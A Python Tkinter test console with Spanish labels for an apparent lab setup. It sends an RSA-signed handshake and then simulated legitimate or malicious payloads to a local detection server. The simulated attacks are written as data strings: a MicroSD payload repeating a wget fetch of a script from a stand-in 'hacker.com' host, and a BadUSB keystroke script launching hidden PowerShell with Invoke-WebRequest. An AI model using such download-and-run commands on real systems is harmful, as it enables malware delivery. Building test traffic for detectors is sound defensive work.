import tkinter as tk
import socket
import json
import threading
import random
import string
import time
import rsa

IP_PC_ESCUDO = '192.168.X.X'  #  IP del PC

# --- CARGAR CLAVE PRIVADA (SIMULACIÓN DE CHIP SEGURO) ---
try:
    with open("clave_privada.pem", "rb") as f:
        CLAVE_PRIVADA = rsa.PrivateKey.load_pkcs1(f.read())
except FileNotFoundError:
    print("❌ ERROR: Falta 'clave_privada.pem'.")
    print("Cópiala desde el PC a la misma carpeta que este script antes de ejecutar.")
    exit()

def generar_datos_aleatorios(tamano):
    """Genera datos de alta entropía (Simula fotos, vídeos, firmware o ZIPs)"""
    caracteres = string.ascii_letters + string.digits + "!@#$%^&*()_+"
    return ''.join(random.choices(caracteres, k=tamano))

def enviar_ataque(tipo):
    def tarea():
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP_PC_ESCUDO, 5000))
            f_in = client.makefile('r', encoding='utf-8')

            # --- CAPA 1: DESAFÍO-RESPUESTA RSA ---
            # 1. Esperamos el desafío del Escudo
            linea = f_in.readline()
            if not linea: return
            paquete_desafio = json.loads(linea)
            nonce = paquete_desafio.get('nonce', '')

            # 2. Firmar el Desafío
            if tipo == "ataque_ducky":
                # Simulamos un BadUSB barato chino: No tiene el chip criptográfico real
                firma = b"firma_falsa_inventada_por_hacker"
            else:
                # Dispositivo con chip original: Firma el Nonce con la Clave Privada
                firma = rsa.sign(nonce.encode('utf-8'), CLAVE_PRIVADA, 'SHA-256')

            # 3. Enviar Respuesta
            paquete_respuesta = {"type": "response", "signature": firma.hex()}
            client.send((json.dumps(paquete_respuesta) + "\n").encode('utf-8'))
            time.sleep(1.5) # Pausa para ver el efecto en el Dashboard

            # --- CAPA 2: INYECCIÓN DE PAYLOADS (Para la IA) ---
            if tipo == "apk_legitimo":
                payload = generar_datos_aleatorios(15000)

            elif tipo == "apk_virus":
                payload = ("A" * 5000) + generar_datos_aleatorios(5000)

            elif tipo == "firmware_camara":
                payload = generar_datos_aleatorios(8000)

            elif tipo == "infeccion_microsd":
                falso_jpeg = generar_datos_aleatorios(10000)
                nop_sled = "\x00" * 5000  # Varianza explosiva
                script_oculto = "#!/bin/bash \n wget http://hacker.com/mal.sh \n" * 50
                payload = falso_jpeg + nop_sled + script_oculto

            elif tipo == "ataque_ducky":
                comandos = "GUI r \n STRING powershell.exe -w hidden -c 'Invoke-WebRequest...' \n ENTER \n " * 50
                payload = comandos

            # Enviar el payload
            paquete_datos = {"type": "data_transfer", "payload": payload}
            client.send((json.dumps(paquete_datos) + "\n").encode('utf-8'))

            time.sleep(1)
            client.close()
        except Exception as e:
            print(f"La conexión se cerró o hubo un error: {e}")

    threading.Thread(target=tarea).start()

# --- INTERFAZ GRÁFICA (GUI) AMPLIADA ---
ventana = tk.Tk()
ventana.title("🔥 Consola de Inyección: Laboratorio Empírico V2 (RSA)")
ventana.geometry("450x450")
ventana.configure(bg="#2d3436")

tk.Label(ventana, text="Vectores Legítimos", fg="#00b894", bg="#2d3436", font=("Arial", 12, "bold")).pack(pady=(15, 5))
tk.Button(ventana, text="📱 Instalar APK Normal (Baja Varianza)", bg="#0984e3", fg="white", font=("Arial", 10),
          command=lambda: enviar_ataque("apk_legitimo")).pack(fill="x", padx=40, pady=5)
tk.Button(ventana, text="📸 Act. Firmware Cámara (Consistente)", bg="#0984e3", fg="white", font=("Arial", 10),
          command=lambda: enviar_ataque("firmware_camara")).pack(fill="x", padx=40, pady=5)

tk.Label(ventana, text="Vectores de Ataque", fg="#d63031", bg="#2d3436", font=("Arial", 12, "bold")).pack(pady=(15, 5))
tk.Button(ventana, text="🦠 Inyectar Dropper (Alta Varianza)", bg="#d63031", fg="white", font=("Arial", 10),
          command=lambda: enviar_ataque("apk_virus")).pack(fill="x", padx=40, pady=5)
tk.Button(ventana, text="🗂️ Infección MicroSD (Script Oculto)", bg="#e84393", fg="white", font=("Arial", 10),
          command=lambda: enviar_ataque("infeccion_microsd")).pack(fill="x", padx=40, pady=5)
tk.Button(ventana, text="⌨️ Inyección Keystroke (BadUSB Clonado)", bg="#e17055", fg="white", font=("Arial", 10),
          command=lambda: enviar_ataque("ataque_ducky")).pack(fill="x", padx=40, pady=5)

ventana.mainloop()
